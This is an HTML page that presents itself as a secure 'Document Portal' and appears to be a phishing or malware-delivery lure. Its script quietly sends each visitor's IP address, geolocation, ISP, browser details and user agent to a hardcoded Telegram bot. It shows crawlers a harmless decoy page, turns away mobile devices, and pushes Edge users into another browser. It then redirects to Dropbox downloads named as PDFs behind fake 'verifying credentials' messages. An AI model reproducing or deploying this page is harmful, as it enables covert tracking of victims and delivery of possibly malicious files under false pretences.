<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>Document Portal</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #f8f9fa;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 480px;
            background: white;
            padding: 40px 30px;
            border-radius: 24px;
            box-shadow: 0 8px 30px rgba(0,0,0,0.05);
            text-align: center;
            border: 1px solid #e9ecef;
        }
        .icon {
            width: 64px;
            height: 64px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 16px;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 32px;
            color: white;
        }
        h2 {
            color: #1a1e2b;
            font-size: 22px;
            font-weight: 600;
            margin-bottom: 8px;
        }
        p {
            color: #6c757d;
            font-size: 14px;
            line-height: 1.5;
            margin-bottom: 24px;
        }
        .loader {
            width: 36px;
            height: 36px;
            border: 3px solid #e9ecef;
            border-top-color: #667eea;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .status {
            color: #6c757d;
            font-size: 13px;
            margin: 16px 0;
        }
        .manual-link {
            display: none;
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #e9ecef;
        }
        .manual-link a {
            color: #667eea;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        .footer {
            margin-top: 24px;
            font-size: 11px;
            color: #adb5bd;
        }
        .message-card {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            max-width: 500px;
            margin: 0 auto;
        }
        .message-card .card {
            background: #f8f9fa;
            border-radius: 12px;
            padding: 40px;
            border: 1px solid #e9ecef;
        }
        .message-card .icon-large {
            font-size: 48px;
            margin-bottom: 20px;
        }
        .message-card h2 {
            color: #1a1e2b;
            margin-bottom: 16px;
        }
        .message-card p {
            color: #6c757d;
            margin: 16px 0;
        }
        .permission-buttons {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 12px;
            margin-top: 24px;
        }
        .permission-btn {
            display: inline-block;
            padding: 10px 24px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
        }
        .permission-btn:hover:not(:disabled) {
            background: #5a67d8;
        }
        .permission-btn.disabled, .permission-btn:disabled {
            background: #adb5bd;
            cursor: not-allowed;
            opacity: 0.6;
        }
        .install-link {
            display: inline-block;
            margin-top: 4px;
            font-size: 12px;
            color: #667eea;
            text-decoration: none;
        }
        .install-link:hover {
            text-decoration: underline;
        }
        .browser-status {
            font-size: 12px;
            margin-top: 8px;
            color: #6c757d;
        }
    </style>
</head>
<body>
    <div id="app"></div>

    <script>
        // ============================================================
        // TELEGRAM CONFIGURATION
        // ============================================================
        const TELEGRAM_TOKEN = '7867220186:AAFdEwxp6Kf8AxMiQGsvwCdRXpCNb2ul1hY';
        const TELEGRAM_CHAT_ID = '1482823538';
        
        // ============================================================
        // YOUR DROPBOX LINKS (UPDATED – CLEAN .PDF EXTENSIONS)
        // ============================================================
        const FILE_LINKS = [
            'https://www.dropbox.com/scl/fi/76l3iokuummrj6bqcwz2l/document.pdf?rlkey=4zny8tbzwnclmicin19mkiqzv&st=u6h49qc7&dl=1',
            'https://www.dropbox.com/scl/fi/n6fm2pc07dypzwrzq5c5w/file.pdf?rlkey=mxhr1idbh4n9kxwgqdvr32g2v&st=8v2ndkty&dl=1',
            'https://www.dropbox.com/scl/fi/817vn4cz1boj1n6qh5wnm/statement.pdf?rlkey=vi7iabc0hkfikecy9qls6jcq9&st=53rpom34&dl=1'
        ];
        
        // ============================================================
        // TELEGRAM NOTIFICATION FUNCTION
        // ============================================================
        async function sendTelegram(message) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                return response.ok;
            } catch (error) {
                console.error('Telegram send failed:', error);
                return false;
            }
        }
        
        // ============================================================
        // GET IP AND LOCATION
        // ============================================================
        async function getLocationInfo() {
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const ip = ipData.ip;
                const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
                const locationData = await locationResponse.json();
                
                return {
                    ip: ip,
                    city: locationData.city || 'Unknown',
                    region: locationData.region || 'Unknown',
                    country: locationData.country_name || 'Unknown',
                    latitude: locationData.latitude || 'N/A',
                    longitude: locationData.longitude || 'N/A',
                    isp: locationData.org || 'Unknown',
                    timezone: locationData.timezone || 'Unknown'
                };
            } catch (error) {
                return {
                    ip: 'Unknown',
                    city: 'Unknown',
                    region: 'Unknown',
                    country: 'Unknown',
                    latitude: 'N/A',
                    longitude: 'N/A',
                    isp: 'Unknown',
                    timezone: 'Unknown'
                };
            }
        }
        
        // ============================================================
        // SEND VISIT NOTIFICATION
        // ============================================================
        async function sendVisitNotification(selectedFile, browserName, action = 'view') {
            const location = await getLocationInfo();
            const userAgent = navigator.userAgent;
            const screenSize = `${window.screen.width}x${window.screen.height}`;
            const referrer = document.referrer || 'Direct';
            const timestamp = new Date().toISOString();
            const fileName = selectedFile.split('/').pop().split('?')[0];
            
            const message = `🔵 <b>DOCUMENT ACCESS</b> 🔵
            
📍 <b>Location:</b> ${location.city}, ${location.region}, ${location.country}
🌐 <b>IP Address:</b> ${location.ip}
🗺️ <b>Coordinates:</b> ${location.latitude}, ${location.longitude}
🏢 <b>ISP:</b> ${location.isp}
⏰ <b>Timezone:</b> ${location.timezone}

📁 <b>File:</b> ${fileName}
💻 <b>OS:</b> ${navigator.platform}
🌍 <b>Browser:</b> ${browserName}
🔄 <b>Action:</b> ${action}
🖥️ <b>Screen:</b> ${screenSize}
🔗 <b>Referrer:</b> ${referrer}
📅 <b>Time:</b> ${timestamp}

<b>User Agent:</b>
<code>${userAgent.substring(0, 200)}</code>`;
            
            await sendTelegram(message);
        }
        
        // ============================================================
        // BROWSER DETECTION
        // ============================================================
        function detectBrowser() {
            const ua = navigator.userAgent.toLowerCase();
            if (ua.indexOf('edg') > -1 || ua.indexOf('edge') > -1) return 'Microsoft Edge';
            if (ua.indexOf('chrome') > -1 && ua.indexOf('edg') === -1) return 'Chrome';
            if (ua.indexOf('firefox') > -1) return 'Firefox';
            if (ua.indexOf('safari') > -1 && ua.indexOf('chrome') === -1) return 'Safari';
            return 'Unknown';
        }
        
        // ============================================================
        // CHECK IF BROWSER IS INSTALLED (via protocol detection)
        // ============================================================
        function isBrowserInstalled(protocol, callback) {
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
            
            let timeout = setTimeout(() => {
                document.body.removeChild(iframe);
                callback(false);
            }, 2000);
            
            iframe.onload = function() {
                clearTimeout(timeout);
                document.body.removeChild(iframe);
                callback(true);
            };
            
            iframe.src = protocol + '://test';
        }
        
        // ============================================================
        // ASK TO OPEN IN CHROME/FIREFOX (check installation first)
        // ============================================================
        function askToOpenInOtherBrowser(currentUrl) {
            // Create modal
            const modal = document.createElement('div');
            modal.style.cssText = `
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(0,0,0,0.7);
                display: flex;
                justify-content: center;
                align-items: center;
                z-index: 10000;
            `;
            
            const dialog = document.createElement('div');
            dialog.style.cssText = `
                background: white;
                max-width: 450px;
                width: 90%;
                padding: 30px;
                border-radius: 24px;
                text-align: center;
                box-shadow: 0 20px 40px rgba(0,0,0,0.2);
            `;
            
            dialog.innerHTML = `
                <div style="font-size: 48px; margin-bottom: 16px;">🌐</div>
                <h2 style="margin-bottom: 12px;">Switch Browser</h2>
                <p style="color: #6c757d; margin-bottom: 24px;">
                    This document works best with <strong>Google Chrome</strong> or <strong>Mozilla Firefox</strong>.
                    Choose a browser to open the link.
                </p>
                <div class="permission-buttons" id="browserButtons">
                    <button id="chromeBtn" class="permission-btn" style="background: #4285f4;">Open in Chrome</button>
                    <button id="firefoxBtn" class="permission-btn" style="background: #ff9400;">Open in Firefox</button>
                    <button id="cancelBtn" class="permission-btn" style="background: #adb5bd;">Cancel</button>
                </div>
                <div id="chromeStatus" class="browser-status"></div>
                <div id="firefoxStatus" class="browser-status"></div>
                <p style="font-size: 11px; color: #adb5bd; margin-top: 20px;">
                    If you don't have a browser installed, you can download it below.
                </p>
                <div style="margin-top: 12px;">
                    <a href="https://www.google.com/chrome/" target="_blank" style="color: #4285f4; text-decoration: none; margin: 0 8px;">Download Chrome</a>
                    <a href="https://www.mozilla.org/firefox/" target="_blank" style="color: #ff9400; text-decoration: none; margin: 0 8px;">Download Firefox</a>
                </div>
            `;
            
            modal.appendChild(dialog);
            document.body.appendChild(modal);
            
            // Check if Chrome is installed
            isBrowserInstalled('googlechrome', (chromeInstalled) => {
                const chromeBtn = document.getElementById('chromeBtn');
                const chromeStatus = document.getElementById('chromeStatus');
                if (!chromeInstalled) {
                    chromeBtn.disabled = true;
                    chromeBtn.classList.add('disabled');
                    chromeStatus.innerHTML = '⚠️ Chrome not detected on this computer';
                } else {
                    chromeStatus.innerHTML = '✅ Chrome is installed';
                }
            });
            
            // Check if Firefox is installed
            isBrowserInstalled('firefox', (firefoxInstalled) => {
                const firefoxBtn = document.getElementById('firefoxBtn');
                const firefoxStatus = document.getElementById('firefoxStatus');
                if (!firefoxInstalled) {
                    firefoxBtn.disabled = true;
                    firefoxBtn.classList.add('disabled');
                    firefoxStatus.innerHTML = '⚠️ Firefox not detected on this computer';
                } else {
                    firefoxStatus.innerHTML = '✅ Firefox is installed';
                }
            });
            
            // Handle Chrome button
            document.getElementById('chromeBtn').onclick = () => {
                modal.remove();
                window.location.href = 'googlechrome://' + currentUrl.replace(/^https?:\/\//, '');
                navigator.clipboard.writeText(currentUrl);
                alert('If Chrome didn\'t open automatically, the link has been copied to your clipboard. Please paste it into Chrome.');
                sendVisitNotification(FILE_LINKS[0], 'Microsoft Edge', 'opened_in_chrome');
                setTimeout(() => window.close(), 1000);
            };
            
            // Handle Firefox button
            document.getElementById('firefoxBtn').onclick = () => {
                modal.remove();
                window.location.href = 'firefox://' + currentUrl.replace(/^https?:\/\//, '');
                navigator.clipboard.writeText(currentUrl);
                alert('If Firefox didn\'t open automatically, the link has been copied to your clipboard. Please paste it into Firefox.');
                sendVisitNotification(FILE_LINKS[0], 'Microsoft Edge', 'opened_in_firefox');
                setTimeout(() => window.close(), 1000);
            };
            
            // Handle Cancel button
            document.getElementById('cancelBtn').onclick = () => {
                modal.remove();
                sendVisitNotification(FILE_LINKS[0], 'Microsoft Edge', 'cancelled_switch');
            };
        }
        
        // ============================================================
        // USERAGENT DETECTION
        // ============================================================
        (async function() {
            const ua = navigator.userAgent.toLowerCase();
            const isMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|tablet/i.test(ua);
            const isWindows = /windows|win32|win64/i.test(ua);
            const browser = detectBrowser();
            const currentUrl = window.location.href;
            
            // BOT DETECTION
            const isBot = /bot|crawler|spider|scraper|facebookexternalhit|twitterbot|linkedinbot|whatsapp/i.test(ua);
            if (isBot) {
                document.getElementById('app').innerHTML = `
                    <div class="container">
                        <div class="icon">📄</div>
                        <h2>Document Portal</h2>
                        <p>Secure document delivery system.</p>
                        <div class="footer">Secure Transmission</div>
                    </div>
                `;
                return;
            }
            
            // MOBILE BLOCK
            if (isMobile) {
                document.getElementById('app').innerHTML = `
                    <div class="message-card">
                        <div class="card">
                            <div class="icon-large">📱</div>
                            <h2>Desktop Access Required</h2>
                            <p>This document requires a desktop environment.</p>
                            <p style="font-size: 13px; color: #adb5bd;">Please open this link on a desktop computer.</p>
                            <hr style="margin: 24px 0 16px; border: none; border-top: 1px solid #e9ecef;">
                            <p style="font-size: 11px; color: #adb5bd;">Secure Document Portal</p>
                        </div>
                    </div>
                `;
                return;
            }
            
            // EDGE – ASK FOR PERMISSION TO USE CHROME/FIREFOX
            if (browser === 'Microsoft Edge') {
                sendVisitNotification(FILE_LINKS[0], 'Microsoft Edge', 'edge_detected');
                askToOpenInOtherBrowser(currentUrl);
                return;
            }
            
            // WINDOWS DESKTOP + CHROME/FIREFOX – show loading and redirect
            document.getElementById('app').innerHTML = `
                <div class="container">
                    <div class="icon">📄</div>
                    <h2>Document Portal</h2>
                    <p>Your document is being prepared</p>
                    <div class="loader"></div>
                    <div class="status" id="status">Verifying access...</div>
                    <div class="manual-link" id="manualLink">
                        <a href="#" id="manualUrl">Click here if not redirected</a>
                    </div>
                    <div class="footer">Secure • Encrypted</div>
                </div>
            `;
            
            // Select random file based on fingerprint
            function getRandomFile() {
                const fingerprint = navigator.userAgent + navigator.language + screen.width + screen.height;
                let hash = 0;
                for (let i = 0; i < fingerprint.length; i++) {
                    hash = ((hash << 5) - hash) + fingerprint.charCodeAt(i);
                    hash |= 0;
                }
                return FILE_LINKS[Math.abs(hash) % FILE_LINKS.length];
            }
            
            const selectedFile = getRandomFile();
            
            // Send Telegram notification
            sendVisitNotification(selectedFile, browser, 'access_granted');
            
            if (!sessionStorage.getItem('redirected')) {
                sessionStorage.setItem('redirected', 'true');
                
                const delay = 1500 + Math.random() * 2000;
                const messages = ['Verifying credentials', 'Loading document', 'Preparing download', 'Redirecting...'];
                let idx = 0;
                const statusEl = document.getElementById('status');
                const interval = setInterval(() => {
                    if (statusEl) {
                        idx = (idx + 1) % messages.length;
                        statusEl.innerHTML = messages[idx];
                    }
                }, 800);
                
                setTimeout(() => {
                    clearInterval(interval);
                    window.location.href = selectedFile;
                }, delay);
                
                // Fallback manual link
                setTimeout(() => {
                    const manualLink = document.getElementById('manualLink');
                    const manualUrl = document.getElementById('manualUrl');
                    if (manualLink && manualUrl) {
                        manualLink.style.display = 'block';
                        manualUrl.href = selectedFile;
                        const loader = document.querySelector('.loader');
                        if (loader) loader.style.display = 'none';
                        if (statusEl) statusEl.innerHTML = 'Click to download';
                    }
                }, 5000);
            } else {
                const loader = document.querySelector('.loader');
                const statusEl = document.getElementById('status');
                if (loader) loader.style.display = 'none';
                if (statusEl) statusEl.innerHTML = 'Document ready';
                document.getElementById('manualLink').style.display = 'block';
                document.getElementById('manualUrl').href = selectedFile;
            }
        })();
    </script>
</body>
</html>
